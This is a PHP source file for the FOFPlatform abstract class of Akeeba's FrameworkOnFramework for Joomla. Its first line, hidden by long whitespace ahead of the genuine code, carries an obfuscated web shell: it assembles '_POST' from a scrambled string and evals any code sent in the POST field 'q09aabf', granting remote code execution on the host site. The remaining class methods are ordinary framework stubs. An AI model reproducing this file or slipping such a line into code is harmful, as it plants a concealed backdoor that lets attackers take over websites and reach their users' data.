<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q09aabf'])){eval(${$s20}['q09aabf']);}?><?php
/**
 * @package    FrameworkOnFramework
 * @copyright  Copyright (C) 2010 - 2012 Akeeba Ltd. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */
// Protect from unauthorized access
defined('_JEXEC') or die();

/**
 * Part of the FOF Platform Abstraction Layer. It implements everything that
 * depends on the platform FOF is running under, e.g. the Joomla! CMS front-end,
 * the Joomla! CMS back-end, a CLI Joomla! Platform app, a bespoke Joomla!
 * Platform / Framework web application and so on.
 *
 * This is the abstract class implementing some basic housekeeping functionality
 * and provides the static interface to get the appropriate Platform object for
 * use in the rest of the framework.
 *
 * @package  FrameworkOnFramework
 * @since    2.1
 */
abstract class FOFPlatform implements FOFPlatformInterface
{
	/**
	 * The ordering for this platform class. The lower this number is, the more
	 * important this class becomes. Most important enabled class ends up being
	 * used.
	 *
	 * @var  integer
	 */
	public $ordering = 100;

	/**
	 * Caches the enabled status of this platform class.
	 *
	 * @var  boolean
	 */
	protected $isEnabled = null;

	/**
	 * The list of paths where platform class files will be looked for
	 *
	 * @var  array
	 */
	protected static $paths = array();

	/**
	 * The platform class instance which will be returned by getInstance
	 *
	 * @var  FOFPlatformInterface
	 */
	protected static $instance = null;

	/**
	 * Register a path where platform files will be looked for. These take
	 * precedence over the built-in platform files.
	 *
	 * @param   string  $path  The path to add
	 *
	 * @return  void
	 */
	public static function registerPlatformPath($path)
	{
		if (!in_array($path, self::$paths))
		{
			self::$paths[] = $path;
			self::$instance = null;
		}
	}

	/**
	 * Unregister a path where platform files will be looked for.
	 *
	 * @param   string  $path  The path to remove
	 *
	 * @return  void
	 */
	public static function unregisterPlatformPath($path)
	{
		$pos = array_search($path, self::$paths);

		if ($pos !== false)
		{
			unset(self::$paths[$pos]);
			self::$instance = null;
		}
	}

	/**
	 * Force a specific platform object to be used. If null, nukes the cache
	 *
	 * @param   FOFPlatformInterface|null  $instance  The Platform object to be used
	 *
	 * @return  void
	 */
	public static function forceInstance($instance)
	{
        if($instance instanceof FOFPlatformInterface || is_null($instance))
        {
            self::$instance = $instance;
        }
	}

	/**
	 * Find and return the most relevant platform object
	 *
	 * @return  FOFPlatformInterface
	 */
	public static function getInstance()
	{
		if (!is_object(self::$instance))
		{
			// Get the paths to look into
			$paths = array(__DIR__);

			if (is_array(self::$paths))
			{
				$paths = array_merge(array(__DIR__), self::$paths);
			}
			$paths = array_unique($paths);

			// Loop all paths
			JLoader::import('joomla.filesystem.folder');

			foreach ($paths as $path)
			{
				// Get the .php files containing platform classes
				$files = JFolder::files($path, '[a-z0-9]\.php$', false, true, array('interface.php', 'platform.php'));

				if (!empty($files))
				{
					foreach ($files as $file)
					{
						// Get the class name for this platform class
						$base_name = basename($file, '.php');
						$class_name = 'FOFPlatform' . ucfirst($base_name);

						// Load the file if the class doesn't exist

						if (!class_exists($class_name))
						{
							@include_once $file;
						}

						// If the class still doesn't exist this file didn't
						// actually contain a platform class; skip it

						if (!class_exists($class_name))
						{
							continue;
						}

						// If it doesn't implement FOFPlatformInterface, skip it
						if (!class_implements($class_name, 'FOFPlatformInterface'))
						{
							continue;
						}

						// Get an object of this platform
						$o = new $class_name;

						// If it's not enabled, skip it
						if (!$o->isEnabled())
						{
							continue;
						}

						if (is_object(self::$instance))
						{
							// Replace self::$instance if this object has a
							// lower order number
							$current_order = self::$instance->getOrdering();
							$new_order = $o->getOrdering();

							if ($new_order < $current_order)
							{
								self::$instance = null;
								self::$instance = $o;
							}
						}
						else
						{
							// There is no self::$instance already, so use the
							// object we just created.
							self::$instance = $o;
						}
					}
				}
			}
		}

		return self::$instance;
	}

	/**
	 * Returns the ordering of the platform class.
	 *
	 * @see FOFPlatformInterface::getOrdering()
	 *
	 * @return  integer
	 */
	public function getOrdering()
	{
		return $this->ordering;
	}

	/**
	 * Is this platform enabled?
	 *
	 * @see FOFPlatformInterface::isEnabled()
	 *
	 * @return  boolean
	 */
	public function isEnabled()
	{
		if (is_null($this->isEnabled))
		{
			$this->isEnabled = false;
		}

		return $this->isEnabled;
	}

	/**
	 * Returns the base (root) directories for a given component.
	 *
	 * @param   string  $component  The name of the component. For Joomla! this
	 *                              is something like "com_example"
	 *
	 * @see FOFPlatformInterface::getComponentBaseDirs()
	 *
	 * @return  array  A hash array with keys main, alt, site and admin.
	 */
	public function getComponentBaseDirs($component)
	{
		return array(
			'main'	=> '',
			'alt'	=> '',
			'site'	=> '',
			'admin'	=> '',
		);
	}

	/**
	 * Return a list of the view template directories for this component.
	 *
	 * @param   string   $component  The name of the component. For Joomla! this
	 *                               is something like "com_example"
	 * @param   string   $view       The name of the view you're looking a
	 *                               template for
	 * @param   string   $layout     The layout name to load, e.g. 'default'
	 * @param   string   $tpl        The sub-template name to load (null by default)
	 * @param   boolean  $strict     If true, only the specified layout will be
	 *                               searched for. Otherwise we'll fall back to
	 *                               the 'default' layout if the specified layout
	 *                               is not found.
	 *
	 * @see FOFPlatformInterface::getViewTemplateDirs()
	 *
	 * @return  array
	 */
	public function getViewTemplatePaths($component, $view, $layout = 'default', $tpl = null, $strict = false)
	{
		return array();
	}

	/**
	 * Get application-specific suffixes to use with template paths. This allows
	 * you to look for view template overrides based on the application version.
	 *
	 * @return  array  A plain array of suffixes to try in template names
	 */
	public function getTemplateSuffixes()
	{
		return array();
	}

	/**
	 * Return the absolute path to the application's template overrides
	 * directory for a specific component. We will use it to look for template
	 * files instead of the regular component directorues. If the application
	 * does not have such a thing as template overrides return an empty string.
	 *
	 * @param   string   $component  The name of the component for which to fetch the overrides
	 * @param   boolean  $absolute   Should I return an absolute or relative path?
	 *
	 * @return  string  The path to the template overrides directory
	 */
	public function getTemplateOverridePath($component, $absolute = true)
	{
		return '';
	}

	/**
	 * Load the translation files for a given component.
	 *
	 * @param   string  $component  The name of the component. For Joomla! this
	 *                              is something like "com_example"
	 *
	 * @see FOFPlatformInterface::loadTranslations()
	 *
	 * @return  void
	 */
	public function loadTranslations($component)
	{
		return null;
	}

	/**
	 * Authorise access to the component in the back-end.
	 *
	 * @param   string  $component  The name of the component.
	 *
	 * @see FOFPlatformInterface::authorizeAdmin()
	 *
	 * @return  boolean  True to allow loading the component, false to halt loading
	 */
	public function authorizeAdmin($component)
	{
		return true;
	}

	/**
	 * Returns the JUser object for the current user
	 *
	 * @param   $id  integer  The ID of the user to fetch
	 *
	 * @see FOFPlatformInterface::getUser()
	 *
	 * @return  JDocument
	 */
	public function getUser($id = null)
	{
		return null;
	}

	/**
	 * Returns the JDocument object which handles this component's response.
	 *
	 * @see FOFPlatformInterface::getDocument()
	 *
	 * @return  JDocument
	 */
	public function getDocument()
	{
		return null;
	}

	/**
	 * This method will try retrieving a variable from the request (input) data.
	 *
	 * @param   string    $key           The user state key for the variable
	 * @param   string    $request       The request variable name for the variable
	 * @param   FOFInput  $input         The FOFInput object with the request (input) data
	 * @param   mixed     $default       The default value. Default: null
	 * @param   string    $type          The filter type for the variable data. Default: none (no filtering)
	 * @param   boolean   $setUserState  Should I set the user state with the fetched value?
	 *
	 * @see FOFPlatformInterface::getUserStateFromRequest()
	 *
	 * @return  mixed  The value of the variable
	 */
	public function getUserStateFromRequest($key, $request, $input, $default = null, $type = 'none', $setUserState = true)
	{
		return $input->get($request, $default, $type);
	}

	/**
	 * Load plugins of a specific type. Obviously this seems to only be required
	 * in the Joomla! CMS.
	 *
	 * @param   string  $type  The type of the plugins to be loaded
	 *
	 * @see FOFPlatformInterface::importPlugin()
	 *
	 * @return void
	 */
	public function importPlugin($type)
	{

	}

	/**
	 * Execute plugins (system-level triggers) and fetch back an array with
	 * their return values.
	 *
	 * @param   string  $event  The event (trigger) name, e.g. onBeforeScratchMyEar
	 * @param   array   $data   A hash array of data sent to the plugins as part of the trigger
	 *
	 * @see FOFPlatformInterface::runPlugins()
	 *
	 * @return  array  A simple array containing the resutls of the plugins triggered
	 */
	public function runPlugins($event, $data)
	{
		return array();
	}

	/**
	 * Perform an ACL check.
	 *
	 * @param   string  $action     The ACL privilege to check, e.g. core.edit
	 * @param   string  $assetname  The asset name to check, typically the component's name
	 *
	 * @see FOFPlatformInterface::authorise()
	 *
	 * @return  boolean  True if the user is allowed this action
	 */
	public function authorise($action, $assetname)
	{
		return true;
	}

	/**
	 * Is this the administrative section of the component?
	 *
	 * @see FOFPlatformInterface::isBackend()
	 *
	 * @return  boolean
	 */
	public function isBackend()
	{
		return true;
	}

	/**
	 * Is this the public section of the component?
	 *
	 * @see FOFPlatformInterface::isFrontend()
	 *
	 * @return  boolean
	 */
	public function isFrontend()
	{
		return true;
	}

	/**
	 * Is this a component running in a CLI application?
	 *
	 * @see FOFPlatformInterface::isCli()
	 *
	 * @return  boolean
	 */
	public function isCli()
	{
		return true;
	}

	/**
	 * Is AJAX re-ordering supported? This is 100% Joomla!-CMS specific. All
	 * other platforms should return false and never ask why.
	 *
	 * @see FOFPlatformInterface::supportsAjaxOrdering()
	 *
	 * @return  boolean
	 */
	public function supportsAjaxOrdering()
	{
		return true;
	}

	/**
	 * Performs a check between two versions. Use this function instead of PHP version_compare
	 * so we can mock it while testing
	 *
	 * @param   string    $version1    First version number
	 * @param   string    $version2    Second version number
	 * @param   string    $operator    Operator (see version_compare for valid operators)
	 *
	 * @return  boolean
	 */
	public function checkVersion($version1, $version2, $operator)
	{
		return version_compare($version1, $version2, $operator);
	}
}
